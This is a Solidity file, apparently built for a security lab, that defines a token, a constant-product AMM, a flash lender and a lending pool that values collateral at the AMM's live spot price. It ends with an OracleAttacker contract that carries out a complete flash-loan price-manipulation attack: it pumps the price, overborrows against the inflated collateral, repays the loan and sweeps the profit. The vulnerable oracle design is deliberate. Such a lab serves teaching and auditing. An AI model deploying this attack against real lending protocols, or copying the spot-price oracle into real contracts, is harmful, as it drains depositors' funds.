// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/// @notice Minimal ERC20 — no external imports, kept self-contained for the lab.
contract VulnToken {
    string public name = "VulnToken";
    string public symbol = "VULN";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 initialSupply) {
        totalSupply = initialSupply;
        balanceOf[msg.sender] = initialSupply;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

/// @notice Constant-product AMM (x*y=k). NO TWAP — spot price is read
/// live and instantaneously, which is exactly what makes it manipulable
/// within a single atomic transaction.
contract SimpleAMM {
    VulnToken public token;
    uint256 public reserveETH;
    uint256 public reserveToken;

    constructor(VulnToken _token) {
        token = _token;
    }

    function seedLiquidity(uint256 tokenAmount) external payable {
        require(reserveETH == 0 && reserveToken == 0, "already seeded");
        token.transferFrom(msg.sender, address(this), tokenAmount);
        reserveETH = msg.value;
        reserveToken = tokenAmount;
    }

    /// wei of ETH that 1.0 whole token is worth, right now, this block.
    function priceTokenInETH() public view returns (uint256) {
        if (reserveToken == 0) return 0;
        return (reserveETH * 1e18) / reserveToken;
    }

    function swapETHForToken() external payable returns (uint256 tokenOut) {
        uint256 k = reserveETH * reserveToken;
        uint256 newReserveETH = reserveETH + msg.value;
        uint256 newReserveToken = k / newReserveETH;
        tokenOut = reserveToken - newReserveToken;
        reserveETH = newReserveETH;
        reserveToken = newReserveToken;
        token.transfer(msg.sender, tokenOut);
    }

    receive() external payable {}
}

interface IFlashBorrower {
    function onFlashLoan(uint256 amount, uint256 fee) external;
}

/// @notice Zero-collateral ETH flash lender — the delivery mechanism, not
/// the bug. Repayment is enforced; nothing here is broken.
contract FlashLender {
    uint256 public constant FEE_BPS = 9; // 0.09%

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(amount <= balanceBefore, "insufficient liquidity");
        uint256 fee = (amount * FEE_BPS) / 10000;
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "loan send failed");
        IFlashBorrower(msg.sender).onFlashLoan(amount, fee);
        require(address(this).balance >= balanceBefore + fee, "loan not repaid");
    }

    receive() external payable {}
}

/// @notice Lends ETH against VulnToken collateral, valued via SimpleAMM's
/// LIVE spot price. THE BUG: no TWAP, no manipulation-resistant oracle —
/// collateral is priced by whatever the AMM says *this instant*.
contract LendingPool {
    SimpleAMM public amm;
    VulnToken public token;
    uint256 public constant LTV_BPS = 5000; // 50%

    mapping(address => uint256) public collateral;
    mapping(address => uint256) public debt;

    constructor(SimpleAMM _amm, VulnToken _token) {
        amm = _amm;
        token = _token;
    }

    function depositCollateral(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        collateral[msg.sender] += amount;
    }

    function borrow(uint256 ethAmount) external {
        uint256 collateralValueETH = (collateral[msg.sender] * amm.priceTokenInETH()) / 1e18;
        uint256 maxBorrow = (collateralValueETH * LTV_BPS) / 10000;
        require(debt[msg.sender] + ethAmount <= maxBorrow, "exceeds LTV");
        debt[msg.sender] += ethAmount;
        (bool ok, ) = msg.sender.call{value: ethAmount}("");
        require(ok, "borrow transfer failed");
    }

    function poolBalance() external view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}

/// @notice One atomic transaction: flash-borrow -> pump AMM price ->
/// post inflated collateral -> overborrow -> repay flash loan -> profit.
/// Needs zero starting capital beyond gas.
contract OracleAttacker is IFlashBorrower {
    SimpleAMM public amm;
    LendingPool public pool;
    FlashLender public lender;
    VulnToken public token;
    address public owner;

    constructor(SimpleAMM _amm, LendingPool _pool, FlashLender _lender, VulnToken _token) {
        amm = _amm;
        pool = _pool;
        lender = _lender;
        token = _token;
        owner = msg.sender;
    }

    function attack(uint256 flashAmount) external {
        require(msg.sender == owner, "not owner");
        lender.flashLoan(flashAmount);
    }

    function onFlashLoan(uint256 amount, uint256 fee) external override {
        require(msg.sender == address(lender), "only lender");

        // 1. Pump: dump the entire flash loan into the AMM.
        amm.swapETHForToken{value: amount}();

        // 2. Post the resulting (artificially cheap-to-acquire) tokens
        //    as collateral, valued at the now-inflated spot price.
        uint256 collateralToPost = token.balanceOf(address(this));
        token.approve(address(pool), collateralToPost);
        pool.depositCollateral(collateralToPost);

        // 3. Borrow the max the (fake) valuation allows.
        uint256 collateralValueETH = (collateralToPost * amm.priceTokenInETH()) / 1e18;
        uint256 borrowAmount = (collateralValueETH * 5000) / 10000;
        pool.borrow(borrowAmount);

        // 4. Repay the flash loan out of the over-borrowed ETH.
        (bool ok, ) = address(lender).call{value: amount + fee}("");
        require(ok, "repay failed");
    }

    function sweep() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
